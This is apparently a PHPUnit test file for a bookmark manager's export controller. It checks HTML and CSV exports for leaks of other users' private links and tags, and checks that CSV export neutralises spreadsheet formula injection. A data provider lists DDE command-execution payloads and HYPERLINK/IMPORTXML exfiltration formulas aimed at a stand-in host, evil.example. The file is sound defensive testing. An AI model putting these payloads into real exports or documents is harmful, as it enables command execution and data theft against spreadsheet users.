<?php

namespace Tests\Controller\App;

use App\Enums\ModelAttribute;
use App\Models\Link;
use App\Models\Tag;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use League\Csv\Reader;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

class ExportControllerTest extends TestCase
{
    use RefreshDatabase;

    private $user;

    protected function setUp(): void
    {
        parent::setUp();

        $this->seed('ExampleSeeder');

        $this->user = User::notSystem()->first();
        $this->actingAs($this->user);
    }

    public function test_valid_export_response(): void
    {
        $response = $this->get('export');

        $response->assertOk()
            ->assertSee('Export');
    }

    public function test_valid_html_export_generation(): void
    {
        $otherUser = User::factory()->create();
        $otherLink = Link::factory()->for($otherUser)->create(['visibility' => ModelAttribute::VISIBILITY_PRIVATE]);

        $response = $this->post('export/html');
        $response->assertOk();

        $content = $response->streamedContent();

        $this->assertStringContainsString(
            '<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">',
            $content
        );
        $this->assertStringNotContainsString($otherLink->url, $content);
    }

    public function test_html_export_does_not_leak_private_tags_of_other_users(): void
    {
        // Simulates a pre-existing cross-user link_tags pivot association, e.g.
        // created via import/sync, where the exporting user's link ends up
        // tagged with another user's private tag.
        $otherUser = User::factory()->create();
        $privateTag = Tag::factory()->for($otherUser)->create([
            'name' => 'other-users-private-tag',
            'visibility' => ModelAttribute::VISIBILITY_PRIVATE,
        ]);

        $ownLink = Link::factory()->for($this->user)->create();
        $ownLink->tags()->attach($privateTag->id);

        $response = $this->post('export/html');
        $response->assertOk();

        $content = $response->streamedContent();

        $this->assertStringNotContainsString($privateTag->name, $content);
    }

    public function test_valid_csv_export_generation(): void
    {
        /** @var Link $link */
        $link = Link::inRandomOrder()->first();

        $otherUser = User::factory()->create();
        $otherLink = Link::factory()->for($otherUser)->create(['visibility' => ModelAttribute::VISIBILITY_PRIVATE]);

        $response = $this->post('export/csv');
        $response->assertOk();

        $content = $response->streamedContent();

        $this->assertStringContainsString(
            sprintf('%s,%s,%s', $link->id, $link->user_id, $link->url),
            $content
        );
        $this->assertStringNotContainsString($otherLink->url, $content);
    }

    /**
     * A bookmark whose title/description is attacker-controlled (e.g. scraped
     * from the <title> of a bookmarked page, or an imported HTML bookmark
     * file) can contain a leading formula-trigger character. Spreadsheet
     * applications interpret such cells as formulas on open, enabling remote
     * command execution (legacy DDE) or data exfiltration (HYPERLINK,
     * WEBSERVICE, IMPORTXML/IMPORTDATA in Google Sheets) (GHSA-c4f9-p83f-m65x).
     */
    public static function formulaInjectionPayloadProvider(): array
    {
        return [
            'equals-sign DDE command execution' => ['=cmd|\' /C calc\'!A0'],
            'plus-sign prefix' => ['+cmd|\' /C calc\'!A0'],
            'minus-sign prefix' => ['-2+3+cmd|\' /C calc\'!A0'],
            'at-sign prefix' => ['@SUM(1+1)*cmd|\' /C calc\'!A0'],
            'HYPERLINK data exfiltration' => ['=HYPERLINK("http://evil.example","x")'],
            'IMPORTXML data exfiltration (Google Sheets)' => ['=IMPORTXML("http://evil.example/collect", "//a")'],
            'leading whitespace bypass attempt' => ["\t =cmd|' /C calc'!A0"],
        ];
    }

    #[DataProvider('formulaInjectionPayloadProvider')]
    public function test_csv_export_neutralizes_formula_injection_payloads(string $payload): void
    {
        $link = Link::factory()->for($this->user)->create([
            'title' => $payload,
            'description' => $payload,
        ]);

        $response = $this->post('export/csv');
        $response->assertOk();

        $content = $response->streamedContent();

        $csv = Reader::createFromString($content);
        $csv->setHeaderOffset(0);

        $record = null;
        foreach ($csv->getRecords() as $row) {
            if ((int) $row['id'] === $link->id) {
                $record = $row;
                break;
            }
        }

        $this->assertNotNull($record, 'Exported link row not found in CSV.');

        foreach (['title', 'description'] as $field) {
            $this->assertSame(
                "'" . $payload,
                $record[$field],
                "The {$field} field was not neutralized against formula injection."
            );
        }
    }
}
